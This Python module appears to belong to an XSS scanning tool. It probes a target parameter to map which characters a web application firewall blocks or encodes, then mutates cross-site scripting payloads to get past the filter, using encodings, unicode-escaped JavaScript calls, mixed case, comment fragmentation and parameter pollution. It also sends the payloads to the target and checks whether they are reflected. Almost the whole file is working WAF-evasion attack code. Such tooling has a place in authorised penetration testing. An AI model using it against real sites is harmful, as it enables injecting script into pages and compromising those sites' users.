import random
import re
from core.requester import requester
from core.config import xsschecker, waf_bypass_strategies, fillings, eFillings, lFillings, functions
from core.encoders import encoder_map
from core.log import setup_logger

logger = setup_logger(__name__)

PROBE_CHARS = [
    '<', '>', '\'', '"', '`', '/', '=', '(', ')',
    ';', '{', '}', '[', ']', '\\', '#', '&', '+',
    '%09', '%0a', '%0d', '%0c', '%0b', '%00',
]


def build_char_matrix(url, params, headers, GET, delay, timeout):
    allowed = set()
    blocked = set()
    encoded = set()
    for char in PROBE_CHARS:
        probe = xsschecker + char
        test_params = dict(params)
        test_params[list(params.keys())[0]] = probe
        try:
            response = requester(url, test_params, headers, GET, delay, timeout)
            if response.status_code and response.status_code >= 400:
                blocked.add(char)
            elif xsschecker in response.text:
                snippet = response.text[response.text.index(xsschecker):response.text.index(xsschecker)+len(probe)+5]
                if char in snippet:
                    allowed.add(char)
                else:
                    encoded.add(char)
            else:
                blocked.add(char)
        except Exception:
            blocked.add(char)
    return {'allowed': allowed, 'blocked': blocked, 'encoded': encoded}


def craft_payload_from_matrix(matrix, base_payload):
    blocked = matrix['blocked']
    replacements = {
        '<': ('%3C', '&lt;', '\\x3c', '\\u003c'),
        '>': ('%3E', '&gt;', '\\x3e', '\\u003e'),
        '\'': ('%27', '\\x27', '\\u0027', '&#39;'),
        '"': ('%22', '\\x22', '\\u0022', '&quot;'),
        ';': ('%3B', '\\x3b', '\\u003b'),
        '=': ('%3D', '\\x3d', '\\u003d'),
        '(': ('%28', '\\x28', '\\u0028'),
        ')': ('%29', '\\x29', '\\u0029'),
    }
    result = ''
    for char in base_payload:
        if char in blocked and char in replacements:
            result += random.choice(replacements[char])
        else:
            result += char
    return result


def generate_waf_specific_payloads(waf_name, base_payloads):
    if waf_name not in waf_bypass_strategies:
        return list(base_payloads)
    strategy = waf_bypass_strategies[waf_name]
    encodings = strategy.get('encoding', [])
    prefixes = strategy.get('payload_prefixes', ['<'])
    techniques = strategy.get('techniques', [])
    payloads = []
    for base in base_payloads:
        for prefix in prefixes:
            for _ in range(3):
                mutated = mutate_payload(base, techniques)
                payloads.append(prefix + mutated)
        for enc_name in encodings[:2]:
            encoder = encoder_map.get(enc_name)
            if encoder:
                payloads.append(encoder(base))
    return list(set(payloads))[:50]


def mutate_payload(payload, techniques):
    result = payload
    if 'js_obfuscation' in techniques:
        result = result.replace('alert', random.choice(['\\u0061lert', '\\x61lert', 'eval(name)']))
        result = result.replace('confirm', random.choice(['con\\u0066irm', 'con\\x66irm', '\\u0063onfirm']))
        result = result.replace('prompt', random.choice(['pro\\u006dpt', 'pro\\x6dpt']))
    if 'double_encoding' in techniques:
        result = result.replace('%', '%25')
    if 'mixed_case' in techniques:
        result = ''.join(random.choice((c, c.upper())) if c.isalpha() else c for c in result)
    if 'entity_encoding' in techniques:
        result = result.replace('<', '&#60;').replace('>', '&#62;')
        result = result.replace('"', '&#34;').replace("'", '&#39;')
    if 'fragmentation' in techniques:
        parts = []
        for i, c in enumerate(result):
            if c in '<>"\'/;=()' and random.random() < 0.3:
                parts.append('<!---->' + c)
            else:
                parts.append(c)
        result = ''.join(parts)
    if 'parameter_pollution' in techniques:
        pass
    return result


def hpp_payload(params, param_name, payload):
    hpp_params = dict(params)
    hpp_params[param_name] = payload
    hpp_params[param_name + '_extra'] = payload
    return hpp_params


def auto_select_encoding(waf_name):
    if waf_name in waf_bypass_strategies:
        encs = waf_bypass_strategies[waf_name].get('encoding', [])
        if encs:
            return encoder_map.get(encs[0])
    return encoder_map.get('mixed')


def test_bypass_payloads(url, params, headers, GET, delay, timeout, payloads):
    results = []
    for payload in payloads:
        test_params = dict(params)
        pname = list(params.keys())[0]
        test_params[pname] = payload
        try:
            response = requester(url, test_params, headers, GET, delay, timeout)
            code = response.status_code if response.status_code else 0
            reflected = payload in response.text if response.text else False
            results.append({
                'payload': payload,
                'status_code': code,
                'reflected': reflected,
                'blocked': code >= 400,
            })
        except Exception:
            results.append({'payload': payload, 'status_code': 0, 'reflected': False, 'blocked': True})
    return results
